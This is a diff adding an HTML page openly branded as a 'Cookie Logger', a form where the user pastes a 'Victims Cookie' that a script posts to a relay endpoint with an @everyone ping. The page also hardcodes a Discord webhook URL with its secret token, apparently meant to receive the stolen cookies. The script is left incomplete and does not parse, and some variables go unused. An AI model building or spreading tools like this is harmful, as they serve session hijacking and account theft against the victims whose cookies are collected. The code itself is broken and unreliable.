@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>🍪 Nxghtz Cookie Logger</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      padding: 20px;
+    }
+
+    .form-card {
+      background-color: #111;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+      max-width: 500px;
+      width: 100%;
+    }
+
+    h1 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #fff;
+    }
+
+    .question-title {
+      font-size: 1rem;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .options-container {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: flex;
+      align-items: center;
+      background: #222;
+      padding: 10px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: 0.3s;
+      border: 1px solid #333;
+    }
+
+    label:hover {
+      background: #333;
+    }
+
+    input[type="radio"] {
+      margin-right: 10px;
+    }
+
+    textarea {
+      width: 100%;
+      min-height: 100px;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #333;
+      background-color: #222;
+      color: #fff;
+      resize: vertical;
+      margin-bottom: 20px;
+    }
+
+    .submit-button {
+      width: 100%;
+      padding: 12px;
+      background: #7289da;
+      border: none;
+      border-radius: 5px;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .submit-button:hover {
+      background: #5b6eae;
+    }
+
+    .footer {
+      margin-top: 15px;
+      font-size: 0.8rem;
+      text-align: center;
+      color: #aaa;
+    }
+
+    .toast {
+      text-align: center;
+      margin-top: 10px;
+      font-size: 0.9rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-card">
+    <form id="surveyForm">
+      <h1>🍪 Nxghtz Cookie Logger 2025</h1>
+
+      <p class="question-title">
+        Do you understand that what you're doing could get you in trouble? <span style="color: red;">*</span>
+      </p>
+
+      <div class="options-container">
+        <label><input type="radio" name="understanding" value="Yes" /> Yes! I understand and want to continue</label>
+        <label><input type="radio" name="understanding" value="No" /> No, I will exit out of the form now</label>
+      </div>
+
+      <label for="additional-info">Victims Cookie:</label>
+      <textarea id="additional-info" placeholder="Paste here..."></textarea>
+
+      <button type="submit" class="submit-button">Submit Response</button>
+
+      <div id="toast" class="toast"></div>
+
+      <div class="footer">This form is secure and your responses are confidential.</div>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById("surveyForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const understanding = document.querySelector('input[name="understanding"]:checked');
+      const comment = document.getElementById("additional-info").value.trim();
+      const toast = document.getElementById("toast");
+
+      if (!understanding) {
+        toast.innerText = "⚠️ Please select an answer.";
+        toast.style.color = "orange";
+        return;
+      }
+
+      const webhookURL = "https://discord.com/api/webhooks/1399053918889050112/s-bLueD6ABZRTghiqhHmjDUYGV4LrJxpTO86z5vzNiZn6O37Sb-WhzCZqg1fL-z5DeHD"; // ⬅️ Ersetze das mit deinem Webhook
+
+      const payload = {
+        content: `@everyone:\n**Cookie:** ${comment || "_Keine Angabe_"}`
+      };
+
+fetch("/api/send", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    content: `@everyone: ${comment || "_Keine Angabe_"}`
+  })
+})
+
+  </script>
+</body>
+</html>
